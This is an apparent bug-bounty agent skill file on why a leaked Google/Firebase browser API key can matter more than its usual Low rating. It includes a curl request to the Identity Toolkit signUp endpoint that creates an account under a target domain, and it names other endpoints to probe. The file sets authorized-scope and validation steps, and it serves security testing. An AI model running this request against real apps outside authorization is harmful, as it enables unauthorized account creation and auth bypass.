# SKILL: Google / Firebase API key impact — not always Low

**Skill id:** `tip/google-firebase-api-key-impact-not-always-low`  
**Category:** API Hacking, Auth Bypass  
**Rating:** 🔥 قوية  
**Status:** Not started  
**Notion:** https://app.notion.com/p/41ddac31e8808123a42ff3e8b91cdf22  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **API Hacking, Auth Bypass**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

A leaked browser Google API key is often filed as Low/Informational. Real impact depends on what the key enables. Identity Toolkit / Firebase Auth endpoints may allow account creation if the app trusts email domain without ownership proof. Document capabilities of the key before closing as Low.

## Payload / Code

```
curl -sk -X POST "[https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=API\_KEY](https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=API_KEY)" 
-H "Content-Type: application/json" 
-d '\{"email":"[you@company.com](mailto:you@company.com)","password":"Test12345!","returnSecureToken":true\}'
Also check: signInWithPassword, sendOobCode, and restricted API surfaces in Google Cloud Console guidance
```

## Source

Twitter/X Godfather Orwa style tips + Identity Toolkit signup patterns (2025–2026)

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
